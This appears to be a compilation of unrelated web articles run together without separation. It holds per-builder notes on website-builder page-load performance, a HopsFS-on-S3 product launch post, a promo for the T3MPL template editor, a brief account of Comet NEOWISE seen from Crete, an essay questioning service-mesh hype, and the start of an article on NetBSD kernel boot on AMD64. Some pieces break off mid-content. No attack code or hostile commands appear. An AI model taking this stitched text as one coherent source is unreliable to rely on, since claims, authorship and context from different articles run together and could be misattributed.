<h4 id="lighthouse-performance-score">Lighthouse Performance Score</h4>
<p>This is an overall assessment of the website's performance, combining 6 different metrics into a score ranging from 0 to 100.</p>
<h4 id="first-contentful-paint-speed-index-si-and-largest-contentful-paint-lcp">First Contentful Paint, Speed Index (SI), and Largest Contentful Paint (LCP)</h4>
<p>The <a href="https://www.debugbear.com/docs/metrics/first-contentful-paint">First Contentful Paint</a> measures when the user first starts seeing page content, such as text or an image.</p>
<p>Speed Index visually measures how quickly the page content reaches its final state.</p>
<p>The <a href="https://www.debugbear.com/docs/metrics/largest-contentful-paint">Largest Contentful Paint</a> measures when the largest element on the page was rendered. Unlike Speed Index, the LCP will increase even if the newly painted element is similar to the previous element content.</p>
<h4 id="tti-time-to-interactive">TTI (Time to Interactive)</h4>
<p>Time to Interactive measures how quickly the page becomes idle, meaning there isn't much ongoing network or CPU activity. This usually means that any interactive elements on the page are ready to be used by the visitor.</p>
<h4 id="cpu-processing-time">CPU Processing Time</h4>
<p>This measures how much time the browser spends on things like running JavaScript code or rendering page content.</p>
<h4 id="page-size">Page Size</h4>
<p>This measures the overall (compressed) download weight of the page.</p>
<h2 id="rendering-performance">Rendering performance</h2>
<p>Minimizing the time it takes for page content to appear after navigating to a page is one of the most important aspects of site performance.</p>
<p>The image shows a side by side view of the rendering timelines of all tested website builders.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/timelines.png" alt="Filmstrips for all tested website builders"></p>
<p>(I added Webflow later, so it's not included in this image.)</p>
<h2 id="a-look-at-the-performance-of-each-site-builder">A look at the performance of each site builder</h2>
<h3 id="versoly">Versoly</h3>
<p>Versoly takes a while to render the image, but doesn't run any additional JavaScript processing once the page has loaded.</p>
<p>A different default background color for the image would make it easier to read the text early on.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly.png" alt="Versoly performance filmstrip"></p>
<p>There are two render-blocking CSS files, both on different domains. That means the existing server connection can't be re-used. The background image does not start loading until the render-blocking CSS has been finished loading.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly-requests.png" alt="Versoly request chart"></p>
<p>Versoly only makes 10 requests overall, which is the lowest request count among all tested site builders.</p>
<h3 id="webflow">Webflow</h3>
<p>Webflow also starts to render quite quickly, but then takes a while to start downloading the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow.png" alt="Webflow performance filmstrip"></p>
<p>With a size of just 2KB, the initial page HTML loads very quickly. However, there are two render-blocking CSS and JavaScript requests, both on different domains that require a new server connection.</p>
<p>The hero background image is defined in the render-blocking CSS file, and therefore doesn't start to load until after the CSS file.</p>
<p>At 355KB the background image is also fairly large and takes a while to download. It could be worth first serving a low-resolution version of the image before starting the full download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow-requests.png" alt="Webflow request chart"></p>
<h3 id="wix">Wix</h3>
<p>Wix quickly renders the general page layout and then loads the image. It looks like the text doesn't show up until a web font is loaded, however this doesn't seem to be the case when testing with a newer version of Chrome.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix.png" alt="Wix performance filmstrip"></p>
<p>Compared to Versoly, the Wix site is a lot chunkier with 66 network requests and 2s of JavaScript execution time.</p>
<p>Wix does not have any render-blocking resources apart from the root document, but downloading the 102KB HTML document can take half a second on a slow connection.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix-requests.png" alt="Wix request chart"></p>
<h3 id="site-123">Site123</h3>
<p>The Site123 page loads fairly quickly, loading two render-blocking CSS files in addition to the document. Once the site has rendered there's isn't much additional work that's done by the CPU.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123.png" alt="Site123 performance filmstrip"></p>
<p>The background image starts loading immediately after the HTML response has arrived, thanks to a <a href="https://www.debugbear.com/blog/resource-hints-rel-preload-prefetch-preconnect"><code>rel="preload"</code></a> tag.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123-requests.png" alt="Site123 request chart"></p>
<h3 id="go-daddy">GoDaddy</h3>
<p>The GoDaddy site contains several render-blocking scripts and stylesheets. The background image loads quickly, as GoDaddy first serves a 1.3KB low-resolution image before serving the higher-resolution version.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy.png" alt="GoDaddy performance filmstrip"></p>
<p>In total, GoDaddy makes 148 network requests when loading the page. Part of this consists of initializing a service worker, so that the site is available offline after the initial load.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy-requests.png" alt="GoDaddy request chart"></p>
<h3 id="jimdo">Jimdo</h3>
<p>The initial render for the Jimdo site is quite slow, and it takes over 6s for the image to show up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo.png" alt="Jimdo performance filmstrip"></p>
<p>The cause of this is a chain of render-blocking CSS requests. First, Jimdo loads <code>layout.css</code>, which in turn contains an <code>@import</code> statement fetching a font definition.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo-requests.png" alt="Jimdo request chart"></p>
<h3 id="yola">Yola</h3>
<p>The Yola site only has partial server-side rendering, most of the work is done by client-side JavaScript. As a result, the page spends 1s running JavaScript before starting to load the background image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola.png" alt="Yola performance filmstrip"></p>
<p>The JavaScript application code, as well as multiple CSS files, also block the initial render for a while.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola-requests.png" alt="Jimdo request chart"></p>
<h3 id="webnode">Webnode</h3>
<p>On the Webnode site, no content is rendered for the first 4s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode.png" alt="Webnode performance filmstrip"></p>
<p>Again we can see a chain of render-blocking CSS requests. The first Typekit CSS file uses <code>@import</code> to load another CSS file.</p>
<p>Importantly, this CSS file is on a different domain, meaning a new server connection has to be set up. This could be sped up by preconnecting to the <code>p.typekit.net</code> domain.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode-requests.png" alt="Webnode request chart"></p>
<h3 id="weebly">Weebly</h3>
<p>Weebly starts rendering after 4s, but text doesn't appear until 5 seconds after opening the page.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly.png" alt="Weebly performance filmstrip"></p>
<p>This is because the page is waiting to load the web fonts before rendering the text. This delay could be avoided by using the CSS <code>font-display: swap</code> option, which would use a default font until the desired font is available.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly-requests.png" alt="Weebly request chart"></p>
<h3 id="wordpress-com">Wordpress.com</h3>
<p>The Wordpress.com site starts to render after about 4s and the image loads after 6s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress.png" alt="Wordpress performance filmstrip"></p>
<p>After the initial load it takes a while for the page to become idle. It makes a total of 355 requests, mostly contacting various advertising domains.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress-requests.png" alt="Wordpress request chart"></p>
<h3 id="strikingly">Strikingly</h3>
<p>Strikingly inlines all necessary CSS into the initial document request. As a result, there are no render-blocking scripts or stylesheets, and Strikingly has the fastest First Contentful Paint with a value of just 1.1s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly.png" alt="Strikingly performance filmstrip"></p>
<p>However, the site then continues to download 1.8MB of JavaScript code. All of this needs to load and execute before the page becomes interactive, for example so that visitors can click on the menu icon.</p>
<p>To speed up that process, the bundle size could be reduced and the two scripts could be loaded in parallel.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-requests.png" alt="Strikingly request chart"></p>
<p>When testing the site with PageSpeed Insights, Lighthouse actually prematurely ends the test before the page finishes loading and becomes interactive. As a result, it reports a Time to Interactive of just 4.5s, and an overall Performance score of 72.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-psi.png" alt="Strikingly PageSpeed Insights score"></p>
<h3 id="square-space">SquareSpace</h3>
<p>SquareSpace starts loading reasonably quickly, but it then takes a long time before the background image shows up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace.png" alt="Squarespace performance filmstrip"></p>
<p>This is because the image is not included in HTML that was rendered on the server, and as a result the browser first needs to download and run 609KB of JavaScript code before starting to load the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace-requests.png" alt="Squarespace request chart"></p>
<h3 id="weblium">Weblium</h3>
<p>Rendering of the Weblium site is blocked for a while due to various CSS files, including a 172 KB stylesheet with embedded web fonts.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium.png" alt="Weblium performance filmstrip"></p>
<p>After the initial render, Weblium launches a React app and starts downloading the background image. Later on in the process a 475 KB JavaScript file called <code>legacy.js</code> is loaded and run.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium-requests.png" alt="Weblium request chart"></p>
<h3 id="u-craft">UCraft</h3>
<p>The UCraft site starts rendering fairly quickly, but the background image is lazy loaded and depends on JavaScript code to run and trigger the image download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft.png" alt="UCraft performance filmstrip"></p>
<p>Once that JavaScript code has run, the page not only downloads the background image but also another 1.16MB that isn't used on the site but appears to be part of the template I used.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft-requests.png" alt="UCraft request chart"></p>
<h3 id="mozello">Mozello</h3>
<p>I tested Mozello as well, but didn't include it in the results because the free plan doesn't support HTTPS. HTTPS is good for security but slightly slows websites down, so it didn't feel like an apples to apples comparison.</p>
<p>Having said that, Mozello's mobile Lighthouse score of 83 was actually the highest overall score. I would expect Mozello sites to be fast even with HTTPS enabled.</p>
<p>With a page weight of 258 KB, Mozello also had the lowest download size. After the initial render there's no further network or CPU activity.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/mozello.png" alt="Mozello filmstrip"></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><p>TLDR; Many developers believe S3 is the "end of file system history". It is impossible to build a file/object storage system on AWS that can compete with S3 on cost. But what if you could build on top of S3 a distributed file system with a HDFS API that gives you POSIX goodness and improved performance? That’s what we have done with a cloud-native release of HopsFS that is highly available across availability zones, has the same cost as S3, but has 100X the performance of S3 for file move/rename operations, and 3.4X the read throughput of S3 (EMRFS) for the DFSIO Benchmark (peer reviewed at ACM Middleware 2020).</p></div><figure id="w-node-31b3b43a5a37-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65d314c5b6d0d5e4ae699_p4lO2294TIlBpyTyn36TMK3IC2UgJYIsOShNfA_v4ubinKblLQKOXG8rKcWnKuxoNJVGfRHWH69bEpG-twMaswNrBnv22mhMlGDVnW2SU3s1mRtQ-7BWL9kii4GleyV774hoZCE4.png" alt=""></p><figcaption><strong>HopsFS has lower latency and higher throughput than EMRFS (S3) for metadata operations (</strong><a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track"><strong>Middleware ‘20</strong></a><strong>).<br></strong></figcaption></figure><h2>The Dumb Bucket</h2><p>S3 has become the de-facto platform for storage in AWS due to its scalability, high availability, and low cost. However, S3 provides weaker guarantees and lower performance compared to distributed hierarchical file systems. Despite this, many developers erroneously believe that S3 is the end of file system history - there is no alternative to S3, so just re-write your applications to account for its limitations (such as slow and inconsistent file listings, non atomic file/dir rename, closed metadata, and limited change data capture (CDC) support). Azure has built an improved file system, <a href="https://docs.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction">Azure Data Lake Storage</a> (ADLS) V2, on top of Azure Blob Storage (ABS) service. ADLS provides a HDFS API to access data stored in a ABS container, giving improved performance and POSIX-like goodness. But, until today, there has been no equivalent to ADLS for S3. Today, we are launching HopsFS as part of <a href="https://www.hopsworks.ai/">Hopsworks</a>.</p><h2>Hierarchical File Systems strike back in the Cloud</h2><p>Hierarchical distributed file systems (like HDFS, CephFS, GlusterFS) were not scalable enough or highly available across availability zones in the cloud, motivating the move to S3 as the scalable storage service of choice. In addition to the technical challenges, AWS have priced virtual machine storage and inter-availability zone network traffic so high that no third party vendor could build a storage system that offers a per-byte storage cost close in price to S3.&nbsp;</p><p>However, the move to S3 has not been without costs. Many applications need to be rewritten as the stronger POSIX-like behaviour of hierarchical file systems (atomic move/rename, consistent file listings, consistent read-after-writes) has been replaced by weakened guarantees in S3. Even simple tasks, such as finding out what files you have, cannot be easily done on S3 when you have enough files, so a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/storage-inventory.html">new service was introduced</a> to enable you to pay extra to get a stale listing of your files. Most analytical applications (e.g., on EMR) use <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a>, instead of S3, which is a new metadata layer for S3 that provides slightly stronger guarantees than S3 - such as consistent file listings.</p><h2>File systems are making the same Journey as Databases</h2><p>The journey from a stronger POSIX-like file system to a weaker object storage paradigm and back again has parallels in the journey that databases have made in recent years. Databases made the transition from strongly consistent single-host systems (relational databases) to highly available (HA), eventually consistent distributed systems (NoSQL systems) to handle the massive increases in data managed by databases. However, <a href="https://www.singlestore.com/blog/why-nosql-databases-wrong-tool-for-modern-application/">NoSQL is just too hard for developers</a>, and databases are returning to strongly consistent (but now scalable) NewSQL systems, with databases such as Spanner, CockroachDB, SingleSQL, and MySQL Cluster.&nbsp;</p><p>In this blog, we show that distributed hierarchical file systems are completing a similar journey, going from strongly consistent POSIX-compliant file systems to object stores (with their weaker consistency models, but high availability across data centers), and back to distributed hierarchical file systems that are HA across data centers, without any loss in performance and, crucially, without any increase in cost, as we will use S3 as block storage for our file system.</p><h2>HopsFS</h2><p>HopsFS is a distributed hierarchical file system that provides a HDFS API (POSIX-like API), but stores its data in a bucket in S3. We redesigned HopsFS to (1) be <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">highly available across availability zones in the cloud</a> and (2) to <a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track">transparently use S3 to store the file’s blocks without sacrificing the file system’s semantics</a>. The original data nodes in HopsFS have now become stateless workers (part of a standard Hopsworks cluster) that include a new block caching service to leverage faster local VM storage for hot blocks. It is important to note that the cache is a global cache - not a local worker cache found in other vendor’s Spark workers - that includes secure access control to the cache. In our experiments, we show that HopsFS outperforms <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a> (S3 with metadata in DynamoDB for improved performance) for IO-bound workloads, with up to 20% higher performance and delivers up to 3.4X the aggregated read throughput of EMRFS. Moreover, we demonstrate that metadata operations on HopsFS (such as directory rename or file move) are up to two orders of magnitude faster than EMRFS. Finally, HopsFS opens up the currently closed metadata in S3, enabling correctly-ordered change notifications with HopsFS’ change data capture (CDC) API and customized extensions to metadata.&nbsp;</p><p>At Logical Clocks, we have leveraged HopsFS’ capabilities to build the industry’s first feature store for machine learning (<a href="https://docs.hopsworks.ai/">Hopsworks Feature Store</a>). The Hopsworks Feature Store is built on <a href="https://github.com/logicalclocks/hive">Hops Hive</a> and customized metadata extensions to HopsFS, ensuring strong consistency between the offline Feature Store, the online Feature Store (<a href="http://mikaelronstrom.blogspot.com/">NDB Cluster</a>), and data files in HopsFS.</p><figure id="w-node-f9d069e8e82e-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65dda6508bd64742b2b40_Screenshot%202020-11-19%20at%2012.58.07.png" loading="lazy" alt=""></p></figure><h3>Some of the key advantages of HopsFS/S3 are:</h3><h4><strong>POSIX-Like Semantics with a HDFS API</strong></h4><ul role="list"><li>Consistent file listings, consistent read-after-write, atomic rename (files/directories).</li></ul><h4><strong>Open, Extensible Metadata</strong></h4><ul role="list"><li><a href="https://hopsworks.readthedocs.io/en/stable/user_guide/hopsfs/xattrs.html">XAttr API</a> to attach arbitrary metadata to files/directories.</li></ul><h4><strong>Change Data Capture API</strong></h4><ul role="list"><li>Correctly ordered stream of file system mutation events delivered with low latency to downstream clients by <a href="https://ieeexplore.ieee.org/document/8752956">ePipe</a>.</li></ul><h4><strong>Free-Text search API for File System Namespace</strong></h4><ul role="list"><li>File system namespace metadata changes can be transparently replicated to Elasticsearch for low-latency free-text search of the namespace and its extended metadata.

Hopsworks.ai is a platform for the design and operation of AI applications at scale with support for scalable compute in the form of Spark, Flink, TensorFlow, etc (comparable to Databricks or AWS EMR). You can also connect Hopsworks.ai to a Kubernetes cluster and launch jobs on Kubernetes that can read/write from HopsFS. You connect your cluster to a S3 bucket in your AWS account or on Azure to a Azure Blob Storage bucket. You can dynamically add/remove workers to/from your cluster, and the workers act as part of the HopsFS cluster - using minimal resources, but reading/writing to/from S3 or ABS on behalf of clients, providing access control, and caching blocks for faster retrieval.</p><h3>References</h3><ul role="list"><li>Ismail Mahmoud, Salman Niazi, Gautier Berthou, …</li></ul></div></div></div></div></div></div>

		<p><img src="https://t3mpl.n4no.com/content/image/5841gmvz8i7y8mycchzx.png" alt="Generate Website Admin Panel"></p>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="🎹-template-contract">🎹 Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="👓-template">👓 Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="💥-generic-editor">💥 Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="🚀-publishing">🚀 Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="📣-summary">📣 Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>

<p>The month was July, the place was the Greek island of Crete, and the sky was spectacular. Of course there were the usual stars like Polaris, Vega, and Antares -- and that common asterism everyone knows: the Big Dipper. </p>



<p>But this sky was just getting started. The band of the Milky Way Galaxy stunned as it arched across the night like a bridge made of stars and dust but dotted with red nebula like candy. The planets Saturn and Jupiter were so bright you wanted to stop people on the beach and point them out. </p>



<p>The air glowed like a rainbow -- but what really grabbed the glory was a comet. Just above the northern horizon, Comet NEOWISE spread its tails like nothing you had ever seen before or might ever see again. Staring in amazement, there was only one thing to do: take a picture. </p>

<p>Hi!</p>
<p>Service meshes have attracted an enormous amount of hype around them. With at least a few talks about service meshes during each tech conference, one can easily be convinced that having a service mesh in their infrastructure is a must. However, hype isn’t a good indicator of whether the new shiny tech is the right solution for your problems. So below, I’ll try to express an anti-hype opinion on service meshes to hopefully make it less confusing when you want to decide whether you may or may not need one.</p>
<p><span><img src="https://serce.me/img/servicemesh/rick.png" alt="rick"></span></p>
<div>
<blockquote>
<p>There’s a lesson here, and I’m not going to be the one to figure it out.</p>
</blockquote>
<p>
— Rick Sanchez
</p>
</div>
<div>
<h3 id="_the_invention">The invention</h3>
<p>Let’s take a step back in history and take a look at one of the <a href="https://eng.lyft.com/envoy-7-months-later-41986c2fd443">early articles</a> about introducing Envoy at Lyft.</p>
<div>
<blockquote>
<p>As it turns out, almost every company with a moderately-sized service oriented architecture is having the same problems that Lyft did prior to the development and deployment of Envoy:</p>
<div>
<ul>
<li>
<p>An architecture composed of a variety of languages, each containing a half-baked RPC library, including partial (or zero) implementations of rate limiting, circuit breaking, timeouts, retries, etc.</p>
</li>
<li>
<p>Differing or partial implementations of stats, logging, and ….</p>
</li>
</ul>
</div>
</blockquote>
</div>
<p>While Envoy is not a service mesh by itself, the outlined problems describe the exact reason why service meshes were invented. They add “rate limiting, circuit breaking, …” and other reliability, observability, and security features to the services by enforcing the communication to go through the service mesh proxies, a data plane. Additionally, they require a separate component, a control plane, to control the configuration.</p>
<p>However, at this point, a lot of people miss the context in which service meshes were introduced. Service meshes are able to solve the problem not because it’s impossible to solve them in any other way. There are many battle-proof RPC libraries that take on the challenges of a separate data plane layer, <a href="https://github.com/twitter/finagle">Finagle</a>, <a href="https://github.com/grpc">gRPC</a>, <a href="https://github.com/line/armeria">Armeria</a>, <a href="https://github.com/apple/servicetalk">Servicetalk</a>, to name a few. After all, the very first service mesh - Linkerd 1.0 <a href="https://github.com/linkerd/linkerd">is powered by Finagle</a>. The RPC libraries will need a component which provides service discovery and configuration management to make it a true mesh. For instance, Zookeeper, or Consul, a component that service meshes call a control plane.</p>
<p>Why introduce a new concept to solve the problems that have been solved before? The service mesh concept wasn’t introduced to address problems that hadn’t been addressed before but rather address them in a way that doesn’t require any modifications to the application code, which is incredibly convenient when it’s hard to introduce an RPC layer into an existing heterogeneous microservice environment.</p>
<p>When you hear service mesh, Istio with Envoy might be the first thing that comes to mind, but it wasn’t the first service mesh to enter the market. Linkerd authors who pioneered the space, described exactly this situation in the <a href="https://linkerd.io/2017/04/25/whats-a-service-mesh-and-why-do-i-need-one/#why-is-the-service-mesh-necessary">"why is the service mesh necessary"</a>. Interestingly, in many hype-y articles on the Internet this context is often forgotten, or omitted.</p>
<p>Solving a problem well, even if it’s a problem that a lot of people have, doesn’t magically provide the tech with a lot of hype. There is always a sponsor behind it. I don’t know who the sponsor was here, and I’m going to speculate, but it’s hard to sell an RPC library in the world where open source is a fundamental requirement. There is no clear business model there, that’s why most of the mature RPC libraries were open-sourced by large tech companies for which it’s not a part of the core business model. A library is just code, not a piece of infrastructure. Service meshes are a different story. It’s an isolated non-trivial piece of infrastructure. As a vendor, not only can you provide consultancy around the configuration and deployment, but you can also sell complete hosted solutions around it.</p>
</div>
<div>
<h3 id="_disillusionments">Disillusionments</h3>
<p>Now that we’ve established the problems, the solution, and most importantly, the context in which the solution was made, let’s take a look at the alternatives. The most obvious one, in the spirit of KISS, is to use an RPC library for your preferred language. Here is where the context is crucial: if you have a large fleet of services, each written in its own language/ecosystem, and the only language that they share is HTTP then having a single shared RPC library is going to be hard. Perhaps, you’ve got a fabric of deployed and running services, but everyone is afraid of touching them, no one knows how they work, and each redeploy is an adventure. A service mesh is here to help you, because at least you’ll be able to roll out new infrastructure features to the mesh regularly.</p>
<p>On the other hand, if you have a fleet of healthy services written in a single application stack, then it’s a good idea to think twice before introducing a service mesh. By simply introducing or evolving a shared RPC library, you’ll get the exact same benefits and avoid dealing with the downsides of maintaining service meshes. By studying the service mesh limitations thoroughly, you can avoid finding yourself in the trough of disillusionment.</p>
<p><span><img src="https://serce.me/img/servicemesh/curve.png" alt="Hype Cycle"></span></p>
<div>
<h4 id="_different_ecosystem">Different ecosystem</h4>
<p>The ecosystem of the service mesh of your choice will likely be different from the ecosystem of your services. Beautiful websites always make you believe that the solution is plug’n’play, always works and never goes down. In reality, sooner or later problems, bugs, quirks in behaviour will reveal themselves, as they always do. At that point, you’ll need to have engineers who work on the service-mesh’s ecosystem which when it’s different from the main app, effectively limits the set of people who can introduce changes or fix problems. This is likely to reintroduce silos, which is against the whole DevOps spirit. Yes, having a DevOps team of engineers who are doing DevOps-y things <a href="https://continuousdelivery.com/2012/10/theres-no-such-thing-as-a-devops-team/">is against DevOps</a>.</p>
</div>
<div>
<h4 id="_unnecessary_overhead">Unnecessary overhead</h4>
<p>Not only having a proxy in front of each service adds overhead (often significant, talking about <a href="https://istio.io/latest/docs/ops/deployment/performance-and-scalability/">90pt</a> rather than 99pt in the performance summary <a href="https://www.infoq.com/presentations/latency-response-time/">doesn’t make software run faster</a>) and consumes resources, but you also requires time (or rather a team of people) to manage them. Yes, it can help to make some of the tasks potentially easier - yay, you can now add canary deployments with a few lines of YAML to simple applications now. However, you still need to manage canary deployments of the proxies themselves which don’t have a proxy in front of them. The problems just get pushed up the stack.</p>
</div>
<div>
<h4 id="_limiting_your_architecture_to_what_the_proxy_supports">Limiting your architecture to what The Proxy supports.</h4>
<p>As you’re reading this paragraph, HTTP/3 is slowly being rolled out to the Internet. It uses UDP as transport. Why use UDP rather than create a completely new protocol you ask? That’s because anything but TCP and UDP is simply “blocked” by the boxes, various proxies on the internet - routers, gateways, etc. This phenomenon got named <a href="https://http3-explained.haxx.se/en/why-quic/why-ossification">ossification</a>. So, only TCP or UDP are left is the practical chose, and even UDP is partially blocked by various corporate proxies which slows down the adoption.</p>
<p>Even though your microservice environment is probably much smaller compared to the Internet, you can draw parallels with service meshes. Proxies can ossify your application architecture by limiting how your services talk to each other, and there is not much benefit in having proxies if you can bypass them. Suppose you want to build a reactive application which is using RSocket over pure tcp? Or perhaps a message-driven application using an actor model? Or maybe push the performance boundaries with Aeron? Not going to happen until the box in the middle becomes aware of the protocol.</p>
</div>
</div>
<div>
<h3 id="_do_i_need_one">Do I need one?</h3>
<p>What does it all mean for you as an engineer? The answer to whether you need to adopt the service mesh approach comes down to the state of the microservice environment you’re trying to improve. As we have established, compared to an RPC framework, service meshes allow you to:</p>
<div>
<ol>
<li>
<p>Deploy the infra changes more often than deploying your services.</p>
</li>
<li>
<p>Introduce infra changes without touching the service code.</p>
</li>
</ol>
</div>
<p>The point 1. is important when for whatever reason you can’t redeploy your services very often, e.g. maybe no one remembers how it’s done anymore, or maybe there are other restrictions. The point 2. is important when your stack is heterogeneous, e.g. some services are built in Go, some in Java, some in Haskell, etc. Where are you on the interval from a huge set of heterogeneous services with unknown deployment schedules to a set of homogenous regularly deployed services defines whether a service mesh is the best solution for you.</p>
</div>
<div>
<h3 id="_conclusion">Conclusion</h3>
<p>Service meshes have a lot of hype around them, and way too much in my opinion. However, before committing to a piece of technology, it’s crucial to understand the problems it solves, and the context in which the solution was made. A service mesh is not an ultimate “good practice” but simply one of the patterns to solve a set of issues, and it’s quite a heavy one.</p>
<p>Rather than jumping on board, look carefully - the last thing you want is to find out that you have invested in a solution for a problem that you don’t have. Service meshes are an amazing piece of tech solving a whole lot of problems. Not in every case, it is the best solution.</p>

<p>System initialization is one of the niche areas that few people look into.
The exact details vary considerably between different platforms, firmwares, CPU architectures and operating systems, making it difficult to learn it all.
Usually, if something is not working correctly during the early stages of system startup or if the OS does not boot, it rarely has anything to do with the code responsible for booting. Most of the time, it is due to other factors, such as the boot media or BIOS configuration.
However, understanding the early initialization process may help debug or to familiarize yourself with a new platform or hardware.</p>

<p>In this article, I will walk through the early kernel initialization process, defining the meaning of this term.
System initialization is a broad topic that ranges from the platform’s hardware design all the way up to typical functions of an operating system such as handling I/O operations.
It is not possible to cover the entire topic adequately within the scope of an article. In this first part I will describe the well-known AMD64: 64-bit platform. I am going to highlight a very interesting part of the initialization process the early initialization of the kernel.
Later, I will compare it with ARM64. In both cases I will discuss the topic in the context of NetBSD, the operating system known for its portability.</p>

<h2 id="the-bigger-picture">The Bigger Picture</h2>

<p>The CPU starting point is called the reset vector: the CPU bootstraps, then fetches and executes the first physical address at location <code>0xFFFFFFF0</code>. The bootloader must always contain a jump to the initialization code in these last top 16 bytes. The CPU is in a variant of a real mode called unreal-mode. 16-bit addressing with segments can address up to 1 MiB of memory.
After the reset, the CS descriptor cache base field contains a special fixed 32-bit value: <code>0xFFFF 0000</code>. (In real-mode a user can change only the lower 16 bits of CS; the upper half, also called the base, is set on reset and hidden).
Using this technique, the instruction pointer addresses relative to the last 64 KiB fragment of the physical memory, which is usually wired to read-only flash memory, where part of the platform firmware (BIOS/UEFI) is located.</p>

<h3 id="bios-or-uefi">BIOS or UEFI?</h3>

<p>BIOS (Basic Input/Output System) is a term used for legacy platform initialization firmware and an interface between the operating system and platform.
It is used mostly with IBM PC compatible machines, such as personal computers or server type machines.
On the other hand, UEFI (Unified Extensible Firmware Interface) is a generic specification, not a particular implementation, and similarly to the BIOS defines an interface between the operating system and platform firmware. The goal of UEFI is to replace legacy interfaces, also is designed to be universal, it can be applied to PC’s or servers as well as embedded devices.
This newer standard was developed to overcome limitations of older standards such as 16-bit processor mode with 1 MB of addressable space, or maximum hard drive sizes from which the operating system can be booted. It also brings new features like secure boot or UEFI runtime services.
